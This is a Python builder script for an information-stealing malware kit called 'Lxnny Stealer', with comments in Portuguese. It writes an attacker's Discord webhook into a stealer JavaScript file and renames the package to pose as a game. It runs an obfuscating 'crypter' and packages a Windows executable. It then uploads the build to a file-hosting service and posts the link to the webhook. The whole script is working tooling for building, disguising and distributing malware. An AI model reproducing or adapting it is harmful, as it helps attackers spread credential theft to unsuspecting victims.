import os
import shutil
import time
import requests
import json
import sys

def uploadToAnonfiles(path):
    try:
        return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except Exception as e:
        print(e)
        return e

def send_test_embed(webhook_url):
    embed_data = {
        "embeds": [
            {
                "author": {
                    "name": "Lxnny Stealer 👀",
                    "icon_url": "https://i.ibb.co/Sd3TP0m/image.png"
                },
                "thumbnail": { "url": 'https://i.ibb.co/Sd3TP0m/image.png' },
                "description": "Sup, your archive is building... Please, be patient <a:loading:1225999342301610045>",
                "footer": {"text": "@lxnnystealer"},
                "color": 0x2b2d31 
            }
        ]
    }

    print(json.dumps(embed_data, indent=4))

    headers = {'Content-Type': 'application/json'}
    response = requests.post(webhook_url, headers=headers, data=json.dumps(embed_data))

    if response.status_code == 200:
        print("Test embed sent successfully.")
    else:
        print("Failed to send test embed. Status code:", response.status_code)

def send_file_embed(webhook_url, file_link):
    embed_data = {
        "embeds": [
            {
                "author": {
                    "name": "Lxnny Stealer 👀",
                    "icon_url": "https://i.ibb.co/Sd3TP0m/image.png"
                },
                "thumbnail": { "url": 'https://i.ibb.co/Sd3TP0m/image.png' },
                "description": f"Sup, your build has been uploaded.\n﹒[Download Link]({file_link})",
                "color": 0x2b2d31,
                "footer": {"text": "@lxnnystealer"},
            }
        ]
    }

    print(json.dumps(embed_data, indent=4))

    headers = {'Content-Type': 'application/json'}
    response = requests.post(webhook_url, headers=headers, data=json.dumps(embed_data))

    if response.status_code == 200:
        print("File link embed sent successfully.")
    else:
        print("Failed to send file link embed. Status code:", response.status_code)

if len(sys.argv) != 3:
    print("Uso: builder.py [webhook] [namefile]")
    sys.exit(1)

webhook = sys.argv[1]
namefile = sys.argv[2]

send_test_embed(webhook)

stealerFile = "./src/stealer.js"
packageFile = "./build/package.json"

with open(stealerFile, 'r', encoding="utf8") as file:
    stealerFileContent = file.read()
    print("Leu o arquivo: "+stealerFile)

oldStealerContent = stealerFileContent
newStealerContent = oldStealerContent.replace("%WEBHOOK_TO_STEALER%", webhook)

with open(stealerFile, 'w', encoding="utf8") as file:
    file.write(newStealerContent)
    print("Escreveu o arquivo: "+stealerFile)

with open(packageFile, 'r', encoding="utf8") as file:
    packageFileContent = file.read()
    print("Leu o arquivo: "+packageFile)

oldPackageContent = packageFileContent
newPackageContent = oldPackageContent.replace("NameOfGame", namefile)

with open(packageFile, 'w', encoding="utf8") as file:
    file.write(newPackageContent)
    print("Escreveu o arquivo: "+packageFile)

try:
    os.remove("./build/AzRkApq1MdmLapQ.js")
    print("Removeu o AzRkApq1MdmLapQ.js")
except:
    pass

if os.path.exists("./build/sk4yx"):
    shutil.rmtree("./build/sk4yx")
    print("Removeu a pasta")

os.chdir("./src/")
os.system("node crypter.js")

os.chdir("../build/")
os.system("npx electron-builder --win")
os.chdir('..')

oldPackageContent = newPackageContent.replace(namefile, "NameOfGame")
oldStealerContent = newStealerContent.replace(webhook, "%WEBHOOK_TO_STEALER%")

with open(stealerFile, 'w', encoding="utf8") as file:
    file.write(oldStealerContent)
    print("Restaurado o arquivo: " + stealerFile)
with open(packageFile, 'w', encoding="utf8") as file:
    file.write(oldPackageContent)
    print("Restaurado o arquivo: " + packageFile)


time.sleep(3)
arquivos_exe = [arquivo for arquivo in os.listdir("./build/sk4yx") if arquivo.endswith(".exe")]

with open(stealerFile, 'w', encoding="utf8") as file:
    file.write(oldStealerContent)

with open(packageFile, 'w', encoding="utf8") as file:
    file.write(oldPackageContent)

arquivo_link = uploadToAnonfiles("./build/sk4yx/"+arquivos_exe[0])
print(arquivo_link)

send_file_embed(webhook, arquivo_link)

print("Done")